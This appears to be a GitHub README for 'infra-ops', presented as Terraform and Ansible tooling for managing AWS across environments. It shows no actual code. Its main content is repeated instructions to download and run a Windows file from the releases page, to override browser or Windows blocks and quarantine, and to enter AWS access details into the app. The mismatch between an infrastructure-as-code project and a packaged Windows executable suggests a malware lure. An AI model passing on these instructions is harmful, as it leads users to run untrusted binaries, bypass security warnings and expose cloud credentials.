# 🛠️ infra-ops - Simple AWS Ops Across Environments

[![Download](https://img.shields.io/badge/Download-Releases-blue?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Mehdiel7730/infra-ops/releases)
[![Releases](https://img.shields.io/badge/Get%20the%20app-Open%20Releases-grey?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Mehdiel7730/infra-ops/releases)

## 📦 What infra-ops does

infra-ops helps you manage AWS setups across more than one environment from one place. It uses Terraform for setup, Ansible for config, and CI/CD for repeatable changes.

This tool is made for teams that need a steady way to handle:

- AWS infrastructure
- Environment setup
- Shared config
- State storage
- Change tracking
- Locking during updates
- Remote config through SSM

## 💻 What you need on Windows

Before you start, make sure your Windows PC can run it well.

- Windows 10 or Windows 11
- Internet access
- A modern web browser
- Permission to run downloaded files
- Enough disk space for the app and its files
- Access to AWS if you plan to use it with live infrastructure

If your team uses AWS, you may also need:

- AWS account access
- Login keys or single sign-on
- Access to S3 buckets
- Access to DynamoDB tables
- Access to AWS Systems Manager

## 🚀 Download the app

Go to the releases page and download and run the file that matches your Windows PC:

[Open the Releases page](https://github.com/Mehdiel7730/infra-ops/releases)

Look for the latest release and choose the Windows file if one is listed. If the release includes a ZIP file, download it, unzip it, then open the app file inside.

## 🪟 Install and start on Windows

Follow these steps on your Windows computer:

1. Open the releases page from the link above.
2. Find the newest version.
3. Download the Windows file or ZIP package.
4. If you downloaded a ZIP file, right-click it and choose Extract All.
5. Open the extracted folder.
6. Double-click the app file to start it.
7. If Windows asks for permission, choose Yes.
8. If your browser or Windows blocks the file, check the file name and choose Keep or Run.

If the app asks for AWS access, enter the details your team gave you.

## 🧭 First-time setup

After you open infra-ops for the first time, set up the basics:

1. Choose the environment you want to work with.
2. Connect your AWS account or profile.
3. Confirm the S3 bucket used for Terraform state.
4. Confirm the DynamoDB table used for locking.
5. Check the SSM settings if your team uses remote config.
6. Review the available infrastructure tasks.
7. Run a small test task first.

If you are new to AWS terms, think of it like this:

- S3 keeps shared state files in one place
- DynamoDB helps stop two changes at the same time
- SSM helps store and read config values
- Terraform creates and updates AWS resources
- Ansible sets up and configures machines

## 🧩 Common tasks

infra-ops is built to help with day-to-day operations. You can use it for tasks such as:

- Set up a new environment
- Update an existing environment
- Apply config changes
- Run playbooks for system setup
- Manage shared values
- Review infrastructure status
- Keep changes in sync across environments

This helps reduce manual work and keeps each environment closer to the same shape.

## 🔐 Working with AWS safely

infra-ops uses common AWS patterns that help keep work organized:

- Terraform state in S3
- State locking in DynamoDB
- Config through SSM
- Reusable modules for shared setup
- Playbooks for repeatable system changes

Use the same AWS profile each time if your team gives you one. This helps keep access clear and avoids mistakes between environments.

## 🗂️ Project layout

The repository includes tools and patterns for:

- Terraform modules
- Ansible roles
- Shared Ansible common files
- GitHub Actions pipelines
- Environment-based config
- Multi-environment AWS work

A simple way to think about the layout:

- Terraform handles AWS resources
- Ansible handles machine setup
- CI/CD handles automated checks and delivery
- GitHub Actions runs the workflows
- Shared modules and roles keep things consistent

## 🛠️ How updates work

When you need a new version:

1. Return to the releases page.
2. Get the newest file.
3. Close the app if it is open.
4. Replace the old file if needed.
5. Open the new version.
6. Confirm that your settings still point to the right AWS environment.

If your team uses a shared setup, keep the same config files and AWS access details unless your admin tells you to change them.

## ✅ Useful checks

If the app does not open, check these items:

- The file finished downloading
- You opened the correct Windows file
- Windows did not move the file to quarantine
- You have permission to run the file
- Your AWS access details are valid
- Your network can reach AWS services

If a task fails, try the following:

1. Check your AWS profile.
2. Check the selected environment.
3. Confirm the S3 state bucket exists.
4. Confirm the DynamoDB lock table exists.
5. Check your SSM values.
6. Try the task again

## 🧪 Typical use case

A common use case looks like this:

1. You open infra-ops on Windows.
2. You pick the target environment.
3. You load the shared config.
4. You run a Terraform action.
5. You apply Ansible setup if needed.
6. You review the result.
7. You repeat the same process for another environment

This setup works well when you need the same process for dev, test, and prod.

## 📚 Topics covered

This project covers:

- Ansible
- Ansible playbooks
- Ansible roles
- CI/CD
- Configuration management
- GitHub Actions
- Infrastructure as code
- Terraform
- Terraform modules

## 🧠 File and environment notes

If you use multiple environments, keep each one separate. A good setup usually includes:

- One state file per environment
- One lock table for shared use
- Clear environment names
- Separate config values for each stage
- Controlled access for production

This helps you avoid using the wrong settings in the wrong place.

## 📥 Get the latest release

Use this page to download and run the Windows file:

[https://github.com/Mehdiel7730/infra-ops/releases](https://github.com/Mehdiel7730/infra-ops/releases)

## 🔧 Basic workflow

A simple workflow for new users is:

1. Download the latest release
2. Open it on Windows
3. Pick your environment
4. Confirm AWS access
5. Run a small operation
6. Check the result
7. Repeat when ready

## 🧷 Best results

For smooth use, keep these habits:

- Use one AWS profile per account or team setup
- Keep environment names clear
- Start with a test environment
- Read each prompt before you confirm
- Store config values in the right place
- Use the latest release when you can